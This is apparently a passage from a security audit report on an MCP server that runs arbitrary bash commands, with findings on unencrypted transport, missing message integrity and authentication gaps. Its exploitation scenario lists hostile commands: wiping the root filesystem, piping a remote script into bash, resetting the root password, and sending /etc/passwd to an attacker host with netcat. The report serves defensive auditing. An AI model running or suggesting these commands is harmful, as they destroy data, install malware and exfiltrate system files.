#### BASH-GOD-001: Command Execution Without Sandboxing
**Severity**: 🔴 CRITICAL  
**CVSS Score**: 9.8 (Critical)  
**Affected Component**: BashGod MCP Server  

**Technical Details**:
- Server allows execution of arbitrary bash commands
- No input validation or command filtering
- Inherits user privileges without restriction
- Direct system access through shell execution

**Exploitation Scenario**:
```bash
# Potential malicious commands through MCP protocol:
rm -rf / --no-preserve-root
curl malicious-site.com/malware | bash
sudo passwd root
cat /etc/passwd | nc attacker.com 4444
```

**Impact Assessment**:
- **System Compromise**: Complete control over host system
- **Data Exfiltration**: Access to all user and system files

## 🛡️ MCP PROTOCOL SECURITY ANALYSIS

### Protocol Implementation Security

#### Current State Assessment
```yaml
MCP Protocol Security Analysis:
  Version: 1.0
  Transport Security: ❌ UNENCRYPTED
  Message Integrity: ❌ NOT IMPLEMENTED
  Authentication: ✅ JWT-BASED (Good)
  Authorization: ✅ RBAC (Good)
  Session Management: ✅ IMPLEMENTED
  Rate Limiting: ⚠️ PARTIAL
```

#### Critical Protocol Vulnerabilities

1. **Unencrypted Communication (PROTOCOL-001)**
   - MCP servers communicate over unencrypted channels
   - Vulnerability to message interception and tampering
   - **Impact**: Credential theft, data exposure, MITM attacks

2. **Missing Message Integrity (PROTOCOL-002)**
   - No cryptographic verification of message authenticity
   - Potential for message tampering and replay attacks
   - **Impact**: Data corruption, unauthorized operations

3. **Insufficient Transport Security (PROTOCOL-003)**
   - Lack of TLS/SSL for inter-server communication
   - Missing certificate validation
   - **Impact**: Network-level security bypass

   - Session invalidation capabilities

#### Critical Gaps Identified ❌

1. **Multi-Factor Authentication (MFA)**
   - No MFA implementation for high-privilege accounts
   - Single factor authentication vulnerability
   - **Recommendation**: Implement TOTP or hardware token MFA

2. **Privilege Escalation Prevention**
   - Insufficient validation of privilege boundaries
   - Missing privilege de-escalation mechanisms
   - **Recommendation**: Implement just-in-time privilege access

3. **Authentication Bypass Vulnerabilities**
   - Multiple code patterns allowing authentication bypass
   - Inconsistent authentication validation
